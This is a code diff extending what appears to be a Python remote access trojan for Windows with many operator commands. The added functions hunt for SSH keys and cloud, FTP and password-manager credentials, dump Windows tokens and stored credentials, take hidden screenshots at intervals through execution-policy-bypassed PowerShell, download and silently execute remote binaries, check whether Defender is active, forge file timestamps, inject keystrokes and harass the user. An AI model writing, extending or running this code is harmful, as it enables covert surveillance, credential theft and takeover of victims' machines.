@@ -1411,4 +1411,1593 @@ def clip_set(text: str) -> str:
     try:
         env = os.environ.copy()
         env['_CLIP_TEXT'] = text
-        subprocess.run(['powershell', '-NoProfile', '-Non
+        subprocess.run(['powershell', '-NoProfile', '-NonInteractive', '-Command',
+                        'Set-Clipboard -Value $env:_CLIP_TEXT'],
+                       capture_output=True, creationflags=0x08000000, env=env, timeout=5)
+        preview = text[:80] + ('...' if len(text) > 80 else '')
+        return f"[+] Clipboard → '{preview}'"
+    except Exception as e:
+        return f"[-] Error: {e}"
+
+# ===================== SCREENSHOT LOOP =====================
+
+_scrloop_active = False
+_scrloop_dir = os.path.join(TEMP, "scrloop")
+
+def scrloop_control(action: str, interval: str = "5") -> str:
+    """Control periodic screenshot capture."""
+    global _scrloop_active
+    if action == "start":
+        if _scrloop_active:
+            return "[*] Already active"
+        try:
+            iv = max(1, int(interval))
+        except:
+            iv = 5
+        os.makedirs(_scrloop_dir, exist_ok=True)
+        ps_script = f'''Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+$b=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $i=1
+while($true){{
+    $bmp=New-Object System.Drawing.Bitmap($b.Width,$b.Height)
+    $g=[System.Drawing.Graphics]::FromImage($bmp)
+    $g.CopyFromScreen($b.Location,[System.Drawing.Point]::Empty,$b.Size)
+    $ts=Get-Date -Format "HHmmss"
+    $bmp.Save("{_scrloop_dir}\\sc_${{ts}}_${{i}}.jpg",[System.Drawing.Imaging.ImageFormat]::Jpeg)
+    $g.Dispose();$bmp.Dispose();$i++
+    Start-Sleep -Seconds {iv}
+}}'''
+        ps_path = os.path.join(TEMP, "sl.ps1")
+        try:
+            with open(ps_path, 'w') as f:
+                f.write(ps_script)
+            subprocess.Popen(['powershell', '-NoProfile', '-EP', 'Bypass', '-WindowStyle', 'Hidden', '-File', ps_path],
+                             creationflags=0x08000000)
+            _scrloop_active = True
+            return f"[+] Screenshot loop started (every {iv}s)"
+        except Exception as e:
+            return f"[-] Error: {e}"
+    elif action == "stop":
+        run_ps('''Get-WmiObject Win32_Process -Filter "Name='powershell.exe'" |
+            Where-Object {$_.CommandLine -like '*sl.ps1*'} |
+            ForEach-Object {Stop-Process -Id $_.ProcessId -Force -EA SilentlyContinue}''')
+        _scrloop_active = False
+        safe_remove(os.path.join(TEMP, "sl.ps1"))
+        return "[+] Screenshot loop stopped"
+    elif action == "dump":
+        frames = sorted(glob.glob(os.path.join(_scrloop_dir, "*.jpg")))
+        if not frames:
+            return "[-] No captures yet"
+        zpath = os.path.join(TEMP, "scrloop.zip")
+        try:
+            with zipfile.ZipFile(zpath, 'w', zipfile.ZIP_DEFLATED) as zf:
+                for f in frames:
+                    zf.write(f, os.path.basename(f))
+            for f in frames:
+                safe_remove(f)
+            return zpath
+        except Exception as e:
+            return f"[-] Error: {e}"
+    elif action == "clear":
+        safe_remove(_scrloop_dir)
+        os.makedirs(_scrloop_dir, exist_ok=True)
+        return "[+] Captures deleted"
+    return "[-] Usage: scrloop <start [sec]|stop|dump|clear>"
+
+# ===================== PROC LIST =====================
+
+def proc_list() -> str:
+    """List running processes in a formatted table."""
+    r = run_cmd('tasklist /v /fo csv /nh', timeout=20)
+    header = f"{'PID':<7} {'Name':<28} {'Mem(KB)':<11} {'User'}"
+    rows = [header, "─" * 65]
+    for l in r.split('\n'):
+        try:
+            p = [x.strip('"') for x in l.strip().split('","')]
+            if len(p) >= 5 and p[1].isdigit():
+                rows.append(f"{p[1]:<7} {p[0][:27]:<28} {p[4][:10].replace(' K',''):<11} {p[6][:25] if len(p)>6 else 'N/A'}")
+        except:
+            continue
+    return "[+] Processes:\n" + "\n".join(rows[:80])
+
+# ===================== CAT FILE =====================
+
+def cat_file(path: str) -> str:
+    """Read and return the contents of a text file."""
+    path = path.strip().strip('"\'')
+    if not os.path.isfile(path):
+        return f"[-] Does not exist: {path}"
+    try:
+        size = os.path.getsize(path)
+        if size > 5 * 1024 * 1024:
+            return f"[-] Too large ({size//1024}KB). Use: download {path}"
+        with open(path, 'r', encoding='utf-8', errors='replace') as f:
+            content = f.read(200000)
+        trunc = len(content) == 200000
+        return f"[+] {path} ({size}B):\n{'─'*40}\n{content}" + ("\n[...truncated...]" if trunc else "")
+    except Exception as e:
+        return f"[-] Error: {e}"
+
+# ===================== FIND SECRETS =====================
+
+def find_secrets() -> str:
+    """Search for common sensitive files."""
+    results = []
+    targets = {
+        "SSH Keys":  [os.path.join(USER_PROFILE, ".ssh", f) for f in ["id_rsa", "id_ed25519", "id_ecdsa", "authorized_keys"]],
+        "AWS Creds": [os.path.join(USER_PROFILE, ".aws", f) for f in ["credentials", "config"]],
+        "Git Config": [os.path.join(USER_PROFILE, ".gitconfig")],
+        "FileZilla": [os.path.join(APPDATA, "FileZilla", "recentservers.xml"),
+                      os.path.join(APPDATA, "FileZilla", "sitemanager.xml")],
+        "WinSCP":    [os.path.join(APPDATA, "WinSCP.ini")],
+        "MobaXterm": [os.path.join(APPDATA, "MobaXterm", "MobaXterm.ini")],
+        "KeePass":   glob.glob(os.path.join(USER_PROFILE, "**", "*.kdbx"), recursive=True)[:3],
+        "VPN":       glob.glob(os.path.join(USER_PROFILE, "**", "*.ovpn"), recursive=True)[:5],
+        ".env":      glob.glob(os.path.join(USER_PROFILE, "**", ".env"), recursive=True)[:5],
+        "Docker":    [os.path.join(USER_PROFILE, ".docker", "config.json")],
+        "Azure":     [os.path.join(USER_PROFILE, ".azure", "accessTokens.json"),
+                      os.path.join(USER_PROFILE, ".azure", "azureProfile.json")],
+        "GCloud":    [os.path.join(APPDATA, "gcloud", "credentials.db"),
+                      os.path.join(APPDATA, "gcloud", "access_tokens.db")],
+        "Slack":     [os.path.join(APPDATA, "Slack", "storage", "slack-downloads")],
+        "Discord":   [os.path.join(APPDATA, "discord", "Local Storage", "leveldb")],
+    }
+    for cat, paths in targets.items():
+        found = [p for p in paths if os.path.isfile(str(p))]
+        if found:
+            results.append(f"\n  [!] {cat}:")
+            for p in found:
+                results.append(f"       {p}")
+    # PuTTY sessions
+    try:
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\SimonTatham\PuTTY\Sessions", 0, winreg.KEY_READ)
+        sessions, i = [], 0
+        while True:
+            try:
+                sessions.append(winreg.EnumKey(key, i))
+                i += 1
+            except:
+                break
+        winreg.CloseKey(key)
+        if sessions:
+            results.append(f"\n  [!] PuTTY Sessions: {', '.join(sessions)}")
+    except:
+        pass
+    # Keyword files on Desktop/Downloads
+    for base in [os.path.join(USER_PROFILE, "Desktop"), os.path.join(USER_PROFILE, "Downloads")]:
+        if os.path.exists(base):
+            for f in os.listdir(base):
+                if any(kw in f.lower() for kw in ['pass', 'cred', 'secret', 'token', 'key', 'api', 'login', 'cuenta', 'contraseña']) and \
+                   any(f.endswith(e) for e in ['.txt', '.xml', '.ini', '.json', '.yml', '.csv', '.xlsx', '.docx']):
+                    results.append(f"\n  [!] File: {os.path.join(base, f)}")
+    if not results:
+        return "[-] No obvious secrets found in common locations"
+    return "[+] Secrets / interesting files:" + "".join(results)
+
+# ===================== NEW COMMANDS v3.0 =====================
+
+# --- PORT SCAN ---
+def port_scan(target: str, ports: str = "") -> str:
+    """Simple TCP port scanner."""
+    target = target.strip()
+    if not ports:
+        port_list = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1433, 1521, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 27017]
+    else:
+        port_list = []
+        for part in ports.split(','):
+            part = part.strip()
+            if '-' in part:
+                try:
+                    a, b = part.split('-')
+                    port_list.extend(range(int(a), int(b) + 1))
+                except:
+                    pass
+            else:
+                try:
+                    port_list.append(int(part))
+                except:
+                    pass
+    if not port_list:
+        return "[-] Invalid ports"
+    results = [f"[*] Scanning {target} ({len(port_list)} ports)..."]
+    open_ports = []
+    for port in port_list:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(0.5)
+            if s.connect_ex((target, port)) == 0:
+                try:
+                    service = socket.getservbyport(port)
+                except:
+                    service = "unknown"
+                open_ports.append(f"  {port}/tcp  OPEN  ({service})")
+            s.close()
+        except:
+            pass
+    if open_ports:
+        results.append(f"[+] {len(open_ports)} open port(s):")
+        results.extend(open_ports)
+    else:
+        results.append("[-] No open ports found")
+    return "\n".join(results)
+
+# --- DNS LOOKUP ---
+def dns_lookup(name: str) -> str:
+    """DNS lookup (forward, reverse, MX)."""
+    name = name.strip()
+    results = [f"[*] DNS Lookup: {name}"]
+    try:
+        ips = socket.getaddrinfo(name, None)
+        seen = set()
+        for info in ips:
+            ip = info[4][0]
+            if ip not in seen:
+                results.append(f"  {ip}  ({info[0].name})")
+                seen.add(ip)
+    except Exception as e:
+        results.append(f"[-] Error: {e}")
+    # Reverse
+    try:
+        ip = socket.gethostbyname(name)
+        rev = socket.gethostbyaddr(ip)
+        results.append(f"  Reverse: {rev[0]}")
+    except:
+        pass
+    # MX records
+    ns = run_cmd(f'nslookup -type=MX {name} 2>nul', timeout=10)
+    if 'mail exchanger' in ns.lower():
+        results.append("\n  MX Records:")
+        for l in ns.split('\n'):
+            if 'mail exchanger' in l.lower():
+                results.append(f"    {l.strip()}")
+    return "\n".join(results)
+
+# --- TRACEROUTE ---
+def traceroute(target: str) -> str:
+    """Run tracert to target."""
+    target = target.strip()
+    return f"[*] Traceroute to {target}:\n" + run_cmd(f'tracert -d -w 500 -h 20 {target}', timeout=60)
+
+# --- ARP TABLE ---
+def arp_table() -> str:
+    """Show ARP table."""
+    return "[+] ARP Table:\n" + run_cmd('arp -a', timeout=10)
+
+# --- DISK INFO ---
+def disk_info() -> str:
+    """Show disk information."""
+    ps = '''Get-WmiObject Win32_LogicalDisk | Select-Object DeviceID, @{N='SizeGB';E={[math]::Round($_.Size/1GB,2)}}, @{N='FreeGB';E={[math]::Round($_.FreeSpace/1GB,2)}}, @{N='Used%';E={if($_.Size -gt 0){[math]::Round(($_.Size-$_.FreeSpace)/$_.Size*100,1)}else{'N/A'}}}, FileSystem, VolumeName | FT -Auto | Out-String -Width 200'''
+    return "[+] Disks:\n" + run_ps(ps, timeout=15)
+
+# --- UPTIME ---
+def get_uptime_str() -> str:
+    """Get system uptime as string."""
+    try:
+        tick = ctypes.windll.kernel32.GetTickCount64()
+        sec = tick // 1000
+        d = sec // 86400
+        h = (sec % 86400) // 3600
+        m = (sec % 3600) // 60
+        return f"{d}d {h}h {m}m"
+    except:
+        return "N/A"
+
+def get_uptime() -> str:
+    """Return uptime string."""
+    return f"[+] Uptime: {get_uptime_str()}"
+
+# --- LOGOFF ---
+def logoff_user() -> str:
+    """Log off current user."""
+    r = run_cmd("shutdown /l /f", timeout=5)
+    return "[+] Session logged off" if '[-]' not in r else r
+
+# --- OPEN URL ---
+def open_url(url: str) -> str:
+    """Open a URL in the default browser."""
+    url = url.strip()
+    if not url.startswith('http'):
+        url = 'https://' + url
+    try:
+        os.startfile(url)
+        return f"[+] URL opened: {url}"
+    except Exception as e:
+        return f"[-] Error: {e}"
+
+# --- TYPE TEXT (simulate keyboard) ---
+def type_text(text: str) -> str:
+    """Simulate keyboard typing."""
+    ps = f'''Add-Type -AssemblyName System.Windows.Forms
+Start-Sleep -Milliseconds 500
+[System.Windows.Forms.SendKeys]::SendWait("{text.replace('{','{{').replace('}','}}').replace('+','{+}').replace('^','{^}').replace('%','{%}')}")'''
+    run_ps(ps, timeout=10)
+    return f"[+] Text typed ({len(text)} characters)"
+
+# --- MSGBOX ---
+def msgbox(title: str, text: str, icon: str = "info") -> str:
+    """Show a custom message box."""
+    icons = {"info": "Information", "warn": "Warning", "error": "Error", "question": "Question"}
+    ic = icons.get(icon, "Information")
+    env = os.environ.copy()
+    env['_MB_TITLE'] = title
+    env['_MB_TEXT'] = text
+    ps = f'Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show($env:_MB_TEXT, $env:_MB_TITLE, "OK", "{ic}") | Out-Null'
+    try:
+        subprocess.run(['powershell', '-NoProfile', '-NonInteractive', '-Command', ps],
+                       timeout=30, capture_output=True, creationflags=0x08000000, env=env)
+        return f"[+] Message displayed: [{title}]"
+    except:
+        return "[-] Error displaying message"
+
+# --- TTS SPEAK (Text to Speech) ---
+def tts_speak(text: str) -> str:
+    """Speak text using SAPI."""
+    vbs_path = os.path.join(TEMP, f"tts_{datetime.datetime.now().strftime('%H%M%S')}.vbs")
+    text_escaped = text.replace('"', '""')
+    try:
+        with open(vbs_path, 'w') as f:
+            f.write(f'CreateObject("SAPI.SpVoice").Speak "{text_escaped}"')
+        subprocess.Popen(['wscript', vbs_path], creationflags=0x08000000)
+        return f"[+] Speaking: '{text[:60]}...'" if len(text) > 60 else f"[+] Speaking: '{text}'"
+    except Exception as e:
+        return f"[-] TTS error: {e}"
+
+# --- STARTUP LIST ---
+def startup_list() -> str:
+    """List startup programs."""
+    r = ["=== Startup Programs ===\n"]
+    for hive_name, hive in [("HKCU", winreg.HKEY_CURRENT_USER), ("HKLM", winreg.HKEY_LOCAL_MACHINE)]:
+        r.append(f"\n[{hive_name}\\...\\Run]:")
+        try:
+            key = winreg.OpenKey(hive, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_READ)
+            i = 0
+            while True:
+                try:
+                    name, val, _ = winreg.EnumValue(key, i)
+                    r.append(f"  {name}: {val}")
+                    i += 1
+                except:
+                    break
+            winreg.CloseKey(key)
+        except:
+            r.append("  (access denied)")
+    startup = os.path.join(APPDATA, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+    if os.path.exists(startup):
+        r.append("\n[Startup Folder]:")
+        for f in os.listdir(startup):
+            r.append(f"  {f}")
+    r.append("\n[Active Scheduled Tasks]:")
+    r.append(run_ps("Get-ScheduledTask | Where {$_.State -eq 'Ready'} | Select -First 20 TaskName,TaskPath | FT -Auto | Out-String -Width 200", timeout=20))
+    return "\n".join(r)
+
+# --- SHARES ---
+def list_shares() -> str:
+    """List shared resources."""
+    return "[+] Shared resources:\n" + run_cmd('net share', timeout=10)
+
+# --- TOKEN STEAL (Windows tokens) ---
+def token_steal() -> str:
+    """Dump identity and token information."""
+    r = ["=== Tokens and Identity ==="]
+    r.append(run_cmd("whoami /all"))
+    r.append("\n=== Stored Credentials ===")
+    r.append(run_cmd("cmdkey /list"))
+    r.append("\n=== Active Sessions ===")
+    r.append(run_cmd("query session 2>nul"))
+    r.append("\n=== Connected Users ===")
+    r.append(run_cmd("query user 2>nul"))
+    return "\n".join(r)
+
+# --- SSH KEYS ---
+def ssh_keys() -> str:
+    """List and display SSH keys."""
+    ssh_dir = os.path.join(USER_PROFILE, ".ssh")
+    if not os.path.exists(ssh_dir):
+        return "[-] .ssh directory does not exist"
+    results = [f"[+] SSH Directory: {ssh_dir}"]
+    for f in os.listdir(ssh_dir):
+        fp = os.path.join(ssh_dir, f)
+        if os.path.isfile(fp):
+            size = os.path.getsize(fp)
+            results.append(f"  {f} ({size}B)")
+            if f.endswith('.pub') or f == 'authorized_keys' or f == 'known_hosts' or f == 'config':
+                try:
+                    with open(fp, 'r', errors='replace') as fh:
+                        content = fh.read(2000)
+                    results.append(f"    ─── content ───\n{content}\n    ───────────────")
+                except:
+                    pass
+    return "\n".join(results)
+
+# --- DOWNLOAD URL ---
+def download_url(url: str, dest: str = "") -> str:
+    """Download a file from the internet."""
+    url = url.strip()
+    if not dest:
+        dest = os.path.join(TEMP, f"dl_{os.path.basename(url.split('?')[0])[:40] or 'file'}")
+    try:
+        urllib.request.urlretrieve(url, dest)
+        size = os.path.getsize(dest)
+        return f"[+] Downloaded: {dest} ({size:,} bytes)"
+    except Exception as e:
+        return f"[-] Download error: {e}"
+
+# --- EXEC REMOTE (download and execute) ---
+def exec_remote(url: str) -> str:
+    """Download a binary from URL and execute it."""
+    url = url.strip()
+    ext = os.path.splitext(url.split('?')[0])[1] or '.exe'
+    dest = os.path.join(TEMP, f"dl_exec_{datetime.datetime.now().strftime('%H%M%S')}{ext}")
+    try:
+        urllib.request.urlretrieve(url, dest)
+        subprocess.Popen(dest, shell=True, creationflags=0x08000000)
+        return f"[+] Downloaded and executed: {dest}"
+    except Exception as e:
+        return f"[-] Error: {e}"
+
+# --- FILE INFO ---
+def file_info(path: str) -> str:
+    """Show detailed file information and hashes."""
+    path = path.strip().strip('"\'')
+    if not os.path.exists(path):
+        return f"[-] Does not exist: {path}"
+    try:
+        st = os.stat(path)
+        r = [f"[+] Info for: {path}"]
+        r.append(f"  Type: {'Directory' if os.path.isdir(path) else 'File'}")
+        r.append(f"  Size: {st.st_size:,} bytes ({st.st_size/1024/1024:.2f} MB)")
+        r.append(f"  Created: {datetime.datetime.fromtimestamp(st.st_ctime).strftime('%Y-%m-%d %H:%M:%S')}")
+        r.append(f"  Modified: {datetime.datetime.fromtimestamp(st.st_mtime).strftime('%Y-%m-%d %H:%M:%S')}")
+        r.append(f"  Accessed: {datetime.datetime.fromtimestamp(st.st_atime).strftime('%Y-%m-%d %H:%M:%S')}")
+        r.append(f"  Permissions: R={'✓' if os.access(path, os.R_OK) else '✗'} W={'✓' if os.access(path, os.W_OK) else '✗'} X={'✓' if os.access(path, os.X_OK) else '✗'}")
+        if os.path.isfile(path):
+            try:
+                with open(path, 'rb') as f:
+                    data = f.read(8192)
+                r.append(f"  MD5: {hashlib.md5(data).hexdigest()}")
+                r.append(f"  SHA256: {hashlib.sha256(data).hexdigest()}")
+            except:
+                pass
+        return "\n".join(r)
+    except Exception as e:
+        return f"[-] Error: {e}"
+
+# --- TOUCH ---
+def touch_file(path: str) -> str:
+    """Create empty file or update timestamp."""
+    path = path.strip().strip('"\'')
+    try:
+        with open(path, 'a'):
+            os.utime(path, None)
+        return f"[+] File touched: {path}"
+    except Exception as e:
+        return f"[-] Error: {e}"
+
+# --- MKDIR ---
+def make_dir(path: str) -> str:
+    """Create a directory."""
+    path = path.strip().strip('"\'')
+    try:
+        os.makedirs(path, exist_ok=True)
+        return f"[+] Directory created: {path}"
+    except Exception as e:
+        return f"[-] Error: {e}"
+
+# --- RMDIR ---
+def remove_dir(path: str) -> str:
+    """Remove a file or directory."""
+    path = path.strip().strip('"\'')
+    if not os.path.exists(path):
+        return f"[-] Does not exist: {path}"
+    try:
+        if os.path.isdir(path):
+            shutil.rmtree(path)
+        else:
+            os.remove(path)
+        return f"[+] Removed: {path}"
+    except Exception as e:
+        return f"[-] Error: {e}"
+
+# --- MV (move/rename) ---
+def move_file(src: str, dst: str) -> str:
+    """Move or rename a file/directory."""
+    try:
+        shutil.move(src.strip(), dst.strip())
+        return f"[+] Moved: {src} → {dst}"
+    except Exception as e:
+        return f"[-] Error: {e}"
+
+# --- CP (copy) ---
+def copy_file(src: str, dst: str) -> str:
+    """Copy a file or directory."""
+    try:
+        if os.path.isdir(src.strip()):
+            shutil.copytree(src.strip(), dst.strip())
+        else:
+            shutil.copy2(src.strip(), dst.strip())
+        return f"[+] Copied: {src} → {dst}"
+    except Exception as e:
+        return f"[-] Error: {e}"
+
+# --- WHOAMI ---
+def whoami() -> str:
+    """Run whoami /all."""
+    return run_cmd("whoami /all")
+
+# --- HOSTNAME ---
+def hostname() -> str:
+    """Show hostname and FQDN."""
+    return f"[+] Hostname: {socket.gethostname()}\n    FQDN: {socket.getfqdn()}"
+
+# --- NETSTAT ---
+def netstat() -> str:
+    """Show network connections."""
+    return "[+] Network connections:\n" + run_cmd("netstat -ano", timeout=15)
+
+# --- WIPE CLIPBOARD ---
+def wipe_clipboard() -> str:
+    """Erase clipboard content."""
+    run_ps("Set-Clipboard -Value ''", timeout=5)
+    return "[+] Clipboard wiped"
+
+# --- SCREEN RESOLUTION ---
+def screen_res() -> str:
+    """Show screen resolution(s)."""
+    ps = '''Add-Type -AssemblyName System.Windows.Forms
+$s = [System.Windows.Forms.Screen]::AllScreens
+$s | ForEach-Object { "$($_.DeviceName): $($_.Bounds.Width)x$($_.Bounds.Height) (Primary=$($_.Primary))" }'''
+    return "[+] Screen resolution:\n" + run_ps(ps, timeout=10)
+
+# --- IDLE TIME ---
+def idle_time() -> str:
+    """Show user idle time."""
+    ps = '''Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+public struct LASTINPUTINFO { public uint cbSize; public uint dwTime; }
+public class IdleCheck {
+    [DllImport("user32.dll")] public static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);
+    public static uint GetIdleMs() {
+        LASTINPUTINFO lii = new LASTINPUTINFO();
+        lii.cbSize = (uint)Marshal.SizeOf(typeof(LASTINPUTINFO));
+        GetLastInputInfo(ref lii);
+        return (uint)Environment.TickCount - lii.dwTime;
+    }
+}
+"@
+$ms = [IdleCheck]::GetIdleMs()
+$sec = [math]::Round($ms / 1000)
+$min = [math]::Round($sec / 60, 1)
+"Idle: $sec seconds ($min minutes)"'''
+    return "[+] " + run_ps(ps, timeout=10)
+
+# --- TIMEZONE ---
+def get_timezone() -> str:
+    """Show system timezone."""
+    ps = "[System.TimeZoneInfo]::Local | Select-Object Id, DisplayName, BaseUtcOffset | FL | Out-String"
+    return "[+] Timezone:\n" + run_ps(ps, timeout=5)
+
+# --- RECENT FILES ---
+def recent_files() -> str:
+    """List recently opened files."""
+    recent = os.path.join(APPDATA, "Microsoft", "Windows", "Recent")
+    if not os.path.exists(recent):
+        return "[-] Recent directory not found"
+    r = ["[+] Recent files (last 30):"]
+    files = []
+    for f in os.listdir(recent):
+        fp = os.path.join(recent, f)
+        try:
+            mt = os.path.getmtime(fp)
+            files.append((mt, f))
+        except:
+            pass
+    files.sort(reverse=True)
+    for mt, f in files[:30]:
+        ts = datetime.datetime.fromtimestamp(mt).strftime('%Y-%m-%d %H:%M')
+        r.append(f"  {ts}  {f}")
+    return "\n".join(r)
+
+# --- INSTALLED DRIVERS ---
+def list_drivers() -> str:
+    """List installed drivers."""
+    return "[+] Installed drivers:\n" + run_cmd("driverquery /v /fo csv", timeout=30)
+
+# --- ACTIVE CONNECTIONS ---
+def active_connections() -> str:
+    """Show established TCP connections and listening ports."""
+    r = ["[+] Active connections (ESTABLISHED):"]
+    out = run_cmd("netstat -n -p tcp | findstr ESTABLISHED", timeout=10)
+    r.append(out)
+    r.append("\n[+] Listening ports (LISTENING):")
+    out2 = run_cmd("netstat -an -p tcp | findstr LISTENING", timeout=10)
+    r.append(out2)
+    return "\n".join(r)
+
+# --- WMIC QUICK INFO ---
+def quick_info() -> str:
+    """Show a quick summary of system information."""
+    r = ["═══ QUICK INFO ═══"]
+    r.append(f"  User:     {getpass.getuser()}")
+    r.append(f"  Host:     {socket.gethostname()}")
+    r.append(f"  Admin:    {'YES' if is_admin() else 'NO'}")
+    r.append(f"  PID:      {os.getpid()}")
+    r.append(f"  Dir:      {os.getcwd()}")
+    r.append(f"  Uptime:   {get_uptime_str()}")
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(('8.8.8.8', 1))
+        ip = s.getsockname()[0]
+        s.close()
+    except:
+        ip = "N/A"
+    r.append(f"  LAN IP:   {ip}")
+    try:
+        with urllib.request.urlopen("https://api.ipify.org", timeout=5) as resp:
+            r.append(f"  WAN IP:   {resp.read().decode()}")
+    except:
+        r.append("  WAN IP:   N/A")
+    r.append(f"  OS:       {run_cmd('ver', timeout=5)}")
+    av = run_ps("Get-MpComputerStatus -EA SilentlyContinue | Select RealTimeProtectionEnabled | FL | Out-String", timeout=10)
+    if 'True' in av:
+        r.append("  Defender: ACTIVE ⚠️")
+    elif 'False' in av:
+        r.append("  Defender: INACTIVE ✓")
+    else:
+        r.append("  Defender: Unknown")
+    return "\n".join(r)
+
+# --- GREP (search text in files) ---
+def grep_files(pattern: str, path: str = ".") -> str:
+    """Search for text inside files."""
+    pattern = pattern.strip()
+    path = path.strip().strip('"\'')
+    if os.path.isfile(path):
+        try:
+            with open(path, 'r', encoding='utf-8', errors='replace') as f:
+                lines = f.readlines()
+            results = []
+            for i, line in enumerate(lines, 1):
+                if pattern.lower() in line.lower():
+                    results.append(f"  {i}: {line.rstrip()}")
+            if results:
+                return f"[+] {len(results)} match(es) in {path}:\n" + "\n".join(results[:50])
+            return f"[-] No matches in {path}"
+        except Exception as e:
+            return f"[-] Error: {e}"
+    else:
+        r = run_cmd(f'findstr /s /i /n "{pattern}" "{path}\\*" 2>nul', timeout=30)
+        lines = [l.strip() for l in r.split('\n') if l.strip() and not l.startswith('[-]')]
+        if lines:
+            return f"[+] {len(lines)} result(s):\n" + "\n".join(lines[:50])
+        return f"[-] No matches for '{pattern}'"
+
+# --- REG QUERY ---
+def reg_query(path: str) -> str:
+    """Query the Windows registry."""
+    path = path.strip()
+    return "[+] Registry:\n" + run_cmd(f'reg query "{path}" 2>nul', timeout=10)
+
+# --- NET USER DETAIL ---
+def net_user_detail(username: str = "") -> str:
+    """List local users or details of a specific user."""
+    if username:
+        return run_cmd(f'net user "{username.strip()}"')
+    return run_cmd('net user')
+
+# --- NET LOCALGROUP ---
+def net_localgroup(group: str = "") -> str:
+    """List local groups or members of a specific group."""
+    if group:
+        return run_cmd(f'net localgroup "{group.strip()}"')
+    return run_cmd('net localgroup')
+
+# --- TAIL FILE ---
+def tail_file(path: str, lines: int = 20) -> str:
+    """Show last N lines of a file."""
+    path = path.strip().strip('"\'')
+    try:
+        n = int(lines)
+    except:
+        n = 20
+    if not os.path.isfile(path):
+        return f"[-] Does not exist: {path}"
+    try:
+        with open(path, 'r', encoding='utf-8', errors='replace') as f:
+            all_lines = f.readlines()
+        tail = all_lines[-n:]
+        return f"[+] Last {n} lines of {path}:\n{'─'*40}\n{''.join(tail)}"
+    except Exception as e:
+        return f"[-] Error: {e}"
+
+# --- HEAD FILE ---
+def head_file(path: str, lines: int = 20) -> str:
+    """Show first N lines of a file."""
+    path = path.strip().strip('"\'')
+    try:
+        n = int(lines)
+    except:
+        n = 20
+    if not os.path.isfile(path):
+        return f"[-] Does not exist: {path}"
+    try:
+        with open(path, 'r', encoding='utf-8', errors='replace') as f:
+            head = [next(f) for _ in range(n)]
+        return f"[+] First {n} lines of {path}:\n{'─'*40}\n{''.join(head)}"
+    except StopIteration:
+        return f"[+] File has fewer than {n} lines:\n{'─'*40}\n{''.join(head)}"
+    except Exception as e:
+        return f"[-] Error: {e}"
+
+# --- WRITE FILE ---
+def write_file(path: str, content: str) -> str:
+    """Write content to a file (overwrites)."""
+    path = path.strip().strip('"\'')
+    try:
+        with open(path, 'w', encoding='utf-8') as f:
+            f.write(content)
+        return f"[+] Written: {path} ({len(content)} chars)"
+    except Exception as e:
+        return f"[-] Error: {e}"
+
+# --- APPEND FILE ---
+def append_file(path: str, content: str) -> str:
+    """Append a line to a file."""
+    path = path.strip().strip('"\'')
+    try:
+        with open(path, 'a', encoding='utf-8') as f:
+            f.write(content + "\n")
+        return f"[+] Appended to: {path}"
+    except Exception as e:
+        return f"[-] Error: {e}"
+
+# --- TREE ---
+def tree_dir(path: str = ".", depth: int = 3) -> str:
+    """Display directory tree."""
+    path = path.strip().strip('"\'')
+    path = os.path.abspath(path)
+    if not os.path.isdir(path):
+        return f"[-] Not a directory: {path}"
+    lines = [f"[+] Tree: {path}"]
+    count = [0]
+
+    def _tree(p, prefix, d):
+        if d <= 0 or count[0] > 200:
+            return
+        try:
+            entries = sorted(os.listdir(p))
+        except:
+            return
+        for i, e in enumerate(entries):
+            count[0] += 1
+            if count[0] > 200:
+                lines.append(f"{prefix}  [...more files...]")
+                return
+            full = os.path.join(p, e)
+            connector = "└── " if i == len(entries) - 1 else "├── "
+            if os.path.isdir(full):
+                lines.append(f"{prefix}{connector}📁 {e}/")
+                ext = "    " if i == len(entries) - 1 else "│   "
+                _tree(full, prefix + ext, d - 1)
+            else:
+                lines.append(f"{prefix}{connector}{e}")
+
+    _tree(path, "", depth)
+    return "\n".join(lines)
+
+# --- CHATTR (change timestamps) ---
+def change_timestamp(path: str, timestamp: str = "") -> str:
+    """Change file timestamps."""
+    path = path.strip().strip('"\'')
+    if not os.path.exists(path):
+        return f"[-] Does not exist: {path}"
+    try:
+        if timestamp:
+            dt = datetime.datetime.strptime(timestamp, "%Y-%m-%d %H:%M:%S")
+            ts = dt.timestamp()
+        else:
+            ts = datetime.datetime(2020, 1, 1).timestamp()
+        os.utime(path, (ts, ts))
+        return f"[+] Timestamps changed: {path} → {datetime.datetime.fromtimestamp(ts).strftime('%Y-%m-%d %H:%M:%S')}"
+    except Exception as e:
+        return f"[-] Error: {e}"
+
+# ===================== TROLLING EXTRAS =====================
+
+def swap_mouse(enable: bool = True) -> str:
+    """Swap or restore mouse buttons."""
+    try:
+        ctypes.windll.user32.SwapMouseButton(enable)
+        return f"[+] Mouse buttons {'swapped' if enable else 'restored'}"
+    except Exception as e:
+        return f"[-] Error: {e}"
+
+def hide_taskbar() -> str:
+    """Hide the Windows taskbar."""
+    try:
+        hwnd = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
+        ctypes.windll.user32.ShowWindow(hwnd, 0)
+        return "[+] Taskbar hidden"
+    except Exception as e:
+        return f"[-] Error: {e}"
+
+def show_taskbar() -> str:
+    """Show the Windows taskbar."""
+    try:
+        hwnd = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
+        ctypes.windll.user32.ShowWindow(hwnd, 9)
+        return "[+] Taskbar restored"
+    except Exception as e:
+        return f"[-] Error: {e}"
+
+def crazy_cursor(seconds: int = 10) -> str:
+    """Move cursor randomly for N seconds."""
+    def _shake():
+        import time as t
+        end = t.time() + seconds
+        while t.time() < end:
+            x = random.randint(0, ctypes.windll.user32.GetSystemMetrics(0))
+            y = random.randint(0, ctypes.windll.user32.GetSystemMetrics(1))
+            ctypes.windll.user32.SetCursorPos(x, y)
